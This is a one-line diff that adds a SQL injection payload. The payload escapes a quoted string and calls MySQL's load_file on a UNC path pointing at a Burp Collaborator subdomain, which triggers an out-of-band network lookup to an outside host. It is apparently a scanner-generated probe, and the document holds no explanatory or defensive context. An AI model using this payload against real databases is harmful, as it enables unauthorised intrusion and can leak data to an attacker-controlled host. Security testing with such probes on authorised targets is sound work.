@@ -1,0 +1,1 @@
+zHd4J670ez'+(select load_file('\\\\3w07hocx4qnx4ockl5jhpa49b0ht5mwandb5yymn.burpcollaborator.net\\lug'))+'
